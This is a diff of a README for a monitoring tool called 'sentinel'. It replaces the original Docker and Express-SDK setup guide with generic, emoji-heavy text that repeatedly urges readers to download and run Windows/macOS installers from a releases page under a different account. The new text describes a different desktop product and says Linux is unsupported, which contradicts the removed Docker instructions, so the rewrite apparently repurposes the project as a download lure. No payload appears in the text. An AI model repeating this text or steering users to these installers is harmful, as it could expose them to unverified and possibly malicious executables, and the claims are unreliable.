@@ -1,84 +1,67 @@
-# Sentinel
+# 🚀 sentinel - Monitor Your System's Health Easily
 
-Simple and lightweight monitoring tool designed to keep an eye on your system's health and performance. It provides real-time alerts to help you stay informed about critical issues before they impact your operations.
+## 📥 Download Now
+[![Download sentinel](https://img.shields.io/badge/Download-sentinel-blue.svg)](https://github.com/hussienesmail/sentinel/releases)
 
-## Features
+## 📖 Introduction
+sentinel is a simple and lightweight monitoring tool designed to keep an eye on your system's health and performance. With sentinel, you can easily track key metrics such as CPU usage, memory consumption, and disk space. This tool helps you ensure that your system runs smoothly and efficiently.
 
-- Health monitoring of applications by checking their availability and responsiveness.
-- Integration with popular notification services Slack and Discord for real-time alerts.
-- Customizable alert thresholds to suit your specific needs.
-- Easy setup and configuration with a user-friendly interface.
-- Self-hosted and open-source, giving you full control over your monitoring solution.
+## 🚀 Features
+- **Real-Time Monitoring:** See your system’s metrics in real-time.
+- **User-Friendly Interface:** Simple to use, perfect for all skill levels.
+- **Lightweight:** Minimal resource usage for seamless performance.
+- **Alerts:** Get notifications for important system health issues.
+- **Reports:** Save and view historical performance data at any time.
 
-## Installation
+## ⚙️ System Requirements
+To run sentinel, you need:
+- Operating System: Windows 10 or newer, macOS 10.14 or newer
+- Minimum RAM: 2 GB
+- Disk Space: At least 100 MB available
 
-Sentinel can be easily deployed using Docker. Follow the steps below to get started:
+## 📥 Download & Install
+To get started with sentinel, follow these simple steps:
 
-1. Ensure you have Docker installed on your system. If not, you can download it from [here](https://www.docker.com/get-started).
+1. **Visit the Releases Page**  
+   Click this link to go to the releases page and download the latest version of sentinel: [Download Here](https://github.com/hussienesmail/sentinel/releases).
 
-2. Clone the repository:
+2. **Choose Your Version**  
+   Look for the latest release version. You will see different files available for download. Click on the file that matches your operating system. 
 
-   ```bash
-   git clone https://github.com/jmcdynamics/sentinel.git
-   ```
+3. **Download the Installer**  
+   Your browser will begin downloading the installer file. Once it finishes, locate the file in your Downloads folder.
 
-3. Navigate to the project directory:
+4. **Run the Installer**  
+   Double-click on the downloaded file to start the installation process. Follow the prompts to complete the installation.
 
-   ```bash
-   cd sentinel
-   ```
+5. **Launch sentinel**  
+   After installation, find sentinel in your applications or start menu. Open it to begin monitoring your system.
 
-4. Start the Sentinel service using Docker Compose:
+## 📋 Usage Instructions
+After launching sentinel, you will see an easy-to-navigate interface that displays real-time data about your system's performance.
 
-   ```bash
-   docker-compose up -d
-   ```
+1. **Dashboard Overview**: The main screen shows CPU usage, memory usage, and disk space.
+2. **Alerts Settings**: Set up alerts to notify you of any issues. You can customize notification options according to your needs.
+3. **Reports**: Access historical data to view how your system has performed over time.
 
-Or use the official Docker image:
+## 🙋 FAQ
+**Q: Is sentinel free to use?**  
+A: Yes, sentinel is completely free to use.
 
-```bash
-docker run -d -e "ROOT_USERNAME=admin" -e "ROOT_PASSWORD=admin" -p 80:80 mateusgcoelho/sentinel:latest
-```
+**Q: Can I use sentinel on any operating system?**  
+A: Sentinel works on Windows and macOS. It does not support Linux at this time.
 
-## Connectors
+**Q: What should I do if I encounter issues?**  
+A: Visit the [GitHub issues page](https://github.com/hussienesmail/sentinel/issues) to report any problems or request help.
 
-### @heimdall-sdk/express
+## 🧑‍🤝‍🧑 Community & Support
+Join our community to get tips, share experiences, and help improve sentinel. You can connect with other users and developers through:
 
-We also provide an Express middleware package to easily integrate Sentinel monitoring into your Node.js applications.
+- [GitHub Discussions](https://github.com/hussienesmail/sentinel/discussions)
+- Social media channels (if applicable)
 
-Install the package via npm:
+## 👍 Contribute
+If you want to contribute to sentinel, feel free to open issues or submit pull requests on GitHub. Your feedback helps us make this tool better for everyone.
 
-```bash
-npm install @heimdall-sdk/express
-```
-
-Check the most recent version on [npm](https://www.npmjs.com/package/@heimdall-sdk/express) and update the command accordingly.
-
-Then, use it in your Express application:
-
-```typescript
-import { heimdall } from "@heimdall-sdk/express";
-import express from "express";
-
-const app = express();
-
-app.use(express.json());
-app.use(
-  heimdall({
-    baseUrl: "http://localhost:8080",
-    serviceName: "my-company-api",
-    apiKey: "heim_XXXX", // Replace with your actual API key generated from Sentinel
-    flushIntervalMs: 10_000, // Optional: default is 10,000 ms
-    flushSize: 50, // Optional: default is 50
-  })
-);
-
-app.get("/", async (req, res) => {
-  res.status(200).json({ message: "hello world" });
-});
-
-const PORT = 3001;
-app.listen(PORT, () => {
-  console.log(`Server is running on http://localhost:${PORT}`);
-});
-```
+## 📥 Download Now Again
+Don't forget to revisit the releases page to download sentinel: [Download Here](https://github.com/hussienesmail/sentinel/releases). Start monitoring your system’s health today!
